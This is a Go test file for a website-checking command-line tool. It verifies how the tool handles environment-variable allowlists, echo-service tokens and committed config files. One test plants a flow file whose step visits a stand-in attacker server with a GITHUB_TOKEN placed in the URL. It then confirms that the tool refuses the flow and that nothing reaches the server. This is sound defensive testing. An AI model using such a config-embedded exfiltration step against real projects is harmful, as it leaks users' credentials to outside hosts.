// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package main

import (
	"bytes"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"

	"github.com/RhythmShahriar/soundcheck/config"
)

// echoStub answers like Echo's health endpoint and records the token each
// request carried.
type echoStub struct {
	*httptest.Server
	mu     sync.Mutex
	tokens []string
}

func newEchoStub(t *testing.T) *echoStub {
	e := &echoStub{}
	e.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		e.mu.Lock()
		e.tokens = append(e.tokens, r.URL.Path+" token="+r.Header.Get("X-Echo-Token"))
		e.mu.Unlock()
		fmt.Fprint(w, `{"tool":"rhythm-echo","version":"1.0.0","mode":"catch"}`)
	}))
	t.Cleanup(e.Close)
	return e
}

func (e *echoStub) seen() string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return strings.Join(e.tokens, "\n")
}

// deadSite is a site address nothing listens on: runs stop before
// browsing anything real.
func deadSite(t *testing.T) string {
	srv := httptest.NewServer(http.NotFoundHandler())
	srv.Close()
	return srv.URL
}

func writeConfig(t *testing.T, body string) {
	t.Helper()
	if err := os.MkdirAll(".soundcheck/flows", 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(".soundcheck/config.yaml", []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestTrustFlags(t *testing.T) {
	t.Chdir(t.TempDir())
	p, err := parse([]string{"a.test", "--allow-env", "GITHUB_TOKEN", "--allow-env", "API_KEY", "--allow-host", "https://WWW.Pay.example:443/",
		"--allow-host", "localhost:20261", "--insecure-login"})
	if err != nil {
		t.Fatal(err)
	}
	tr := p.cfg.Trust
	if strings.Join(tr.AllowEnv, ",") != "GITHUB_TOKEN,API_KEY" || strings.Join(tr.AllowHosts, ",") != "pay.example,localhost:20261" || !tr.InsecureLogin {
		t.Errorf("trust = %+v", tr)
	}
	if p, _ := parse([]string{"a.test"}); len(p.cfg.Trust.AllowEnv)+len(p.cfg.Trust.AllowHosts) != 0 || p.cfg.Trust.InsecureLogin {
		t.Errorf("trust by default: %+v", p.cfg.Trust)
	}
	for args, want := range map[string]string{
		"a.test --allow-env A=B":      `--allow-env: "A=B" isn't`,
		"a.test --allow-env ${X}":     `--allow-env: "${X}" isn't`,
		"a.test --allow-host http://": `--allow-host: "http://" isn't a host`,
	} {
		if _, err := parse(strings.Fields(args)); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: %v, want %q", args, err, want)
		}
	}
}

func TestEchoToken(t *testing.T) {
	t.Setenv("RHYTHM_ECHO_TOKEN", "tok-123")
	for _, tc := range []struct {
		from, url, token, stderr string
	}{
		{"flag", "http://10.0.0.5:8025", "tok-123", ""},
		{"env", "https://echo.example.test", "tok-123", ""},
		{"config", "http://127.0.0.1:8025", "tok-123", "Echo turned on by .soundcheck/config.yaml (echo.url)\n"},
		{"config", "http://localhost:8025", "tok-123", "Echo turned on by .soundcheck/config.yaml (echo.url)\n"},
		{"config", "http://10.0.0.5:8025", "", "Echo turned on by .soundcheck/config.yaml (echo.url)\n" +
			"rhythm-soundcheck: not sending RHYTHM_ECHO_TOKEN to http://10.0.0.5:8025: the address came from the config; pass --echo=http://10.0.0.5:8025 to send it\n"},
	} {
		var errb bytes.Buffer
		cfg := config.Default()
		cfg.Echo.URL = tc.url
		s := &session{plan: &plan{cfg: cfg, echoFrom: tc.from, configPath: ".soundcheck/config.yaml"}, stderr: &errb}
		if got := s.echoToken(); got != tc.token || errb.String() != tc.stderr {
			t.Errorf("%s %s: token %q, stderr %q", tc.from, tc.url, got, errb.String())
		}
	}
	t.Setenv("RHYTHM_ECHO_TOKEN", "")
	var errb bytes.Buffer
	cfg := config.Default()
	cfg.Echo.URL = "http://10.0.0.5:8025"
	s := &session{plan: &plan{cfg: cfg, echoFrom: "config", configPath: "c.yaml"}, stderr: &errb}
	if got := s.echoToken(); got != "" || errb.String() != "Echo turned on by c.yaml (echo.url)\n" {
		t.Errorf("no token: %q %q", got, errb.String())
	}
}

func TestEchoFrom(t *testing.T) {
	t.Chdir(t.TempDir())
	t.Setenv("SOUNDCHECK_ECHO", "")
	writeConfig(t, "echo:\n  url: http://127.0.0.1:9100\n")
	for args, want := range map[string]string{
		"a.test": "config", "a.test --echo": "flag", "a.test --skip echo": "", "a.test --echo=false": "",
	} {
		p, err := parse(strings.Fields(args))
		if err != nil || p.echoFrom != want {
			t.Errorf("%s: echoFrom %q %v, want %q", args, p.echoFrom, err, want)
		}
	}
	t.Setenv("SOUNDCHECK_ECHO", "1")
	if p, _ := parse([]string{"a.test"}); p.echoFrom != "env" {
		t.Errorf("SOUNDCHECK_ECHO: %q", p.echoFrom)
	}
}

// The live proofs from the security review, end to end: what a committed
// config can no longer send and what still works.
func TestEchoTokenFromConfig(t *testing.T) {
	t.Chdir(t.TempDir())
	t.Setenv("SOUNDCHECK_ECHO", "")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI-DEMO-SECRET")
	t.Setenv("RHYTHM_ECHO_TOKEN", "echo-tok")
	echo := newEchoStub(t)
	site := deadSite(t)

	writeConfig(t, "echo:\n  url: "+echo.URL+"\n  token_env: AWS_SECRET_ACCESS_KEY\n")
	code, _, errOut := runCLI(t, "run", site, "--modules", "health", "--plain")
	if code != exitUsage || !strings.Contains(errOut, `echo.token_env: "AWS_SECRET_ACCESS_KEY" must start with RHYTHM_ECHO_`) {
		t.Errorf("token_env: exit %d, %q", code, errOut)
	}
	if got := echo.seen(); got != "" {
		t.Errorf("Echo was asked: %s", got)
	}

	// The default token still reaches an Echo on this machine.
	writeConfig(t, "echo:\n  url: "+echo.URL+"\n")
	_, _, errOut = runCLI(t, "run", site, "--modules", "health", "--plain", "--no-download", "--browser", "/nonexistent/chrome")
	if !strings.Contains(errOut, "Echo turned on by .soundcheck/config.yaml (echo.url)\n") {
		t.Errorf("no notice: %q", errOut)
	}
	if got := echo.seen(); got != "/v1/health token=echo-tok" {
		t.Errorf("Echo saw %q", got)
	}
}

func TestFlowEnvRefused(t *testing.T) {
	t.Chdir(t.TempDir())
	t.Setenv("SOUNDCHECK_ECHO", "")
	t.Setenv("GITHUB_TOKEN", "ghp_DEMO0000SECRET")
	var mu sync.Mutex
	var hits []string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		hits = append(hits, r.URL.RequestURI())
		mu.Unlock()
	}))
	defer attacker.Close()
	writeConfig(t, "interactions:\n  levels: [inspect, click, flows]\n")
	_ = os.WriteFile(".soundcheck/flows/smoke.yaml", []byte("name: Home page smoke test\nsteps:\n  - goto: \""+attacker.URL+
		"/collect?k=${env:GITHUB_TOKEN}\"\n  - expect: {text: Page}\n"), 0o600)
	site := deadSite(t)
	dead := deadSite(t)

	code, out, errOut := runCLI(t, "run", site, "--modules", "health,interact", "--plain")
	if code != exitUsage || !strings.Contains(out, `Flows: "Home page smoke test" reads GITHUB_TOKEN`) ||
		!strings.Contains(errOut, "smoke.yaml: flows read only SOUNDCHECK_* variables; to let this one read GITHUB_TOKEN, pass --allow-env GITHUB_TOKEN") {
		t.Errorf("exit %d\n%s\n%s", code, out, errOut)
	}
	if strings.Contains(out+errOut, "ghp_DEMO") {
		t.Error("the value was printed")
	}

	// --allow-env lets it through to the next step (a dead Echo stops the
	// run there, before anything is browsed).
	code, _, errOut = runCLI(t, "run", site, "--modules", "health,interact", "--plain", "--allow-env", "GITHUB_TOKEN", "--echo="+dead)
	if code != exitUsage || !strings.Contains(errOut, "Echo isn't running") {
		t.Errorf("--allow-env: exit %d, %q", code, errOut)
	}

	// Without the flows level, the flow isn't read.
	code, out, errOut = runCLI(t, "run", site, "--modules", "health,interact", "--level", "inspect", "--plain", "--echo="+dead)
	if strings.Contains(out, "Flows:") || !strings.Contains(errOut, "Echo isn't running") {
		t.Errorf("level inspect: exit %d\n%s\n%s", code, out, errOut)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(hits) != 0 {
		t.Errorf("the other host was asked: %v", hits)
	}
}

// Pages from --page are told apart from the config file's pages: extra:,
// so a note about one names where it came from.
func TestPageFlagMarked(t *testing.T) {
	t.Chdir(t.TempDir())
	writeConfig(t, "pages:\n  extra: [/from-file/]\n")
	p, err := parse([]string{"a.test", "--page", "/from-flag/"})
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(p.cfg.Pages.Extra, " "); got != "/from-file/ /from-flag/" {
		t.Errorf("extra %s", got)
	}
	if got := strings.Join(p.cfg.Pages.Flag, " "); got != "/from-flag/" {
		t.Errorf("flag %s", got)
	}
}
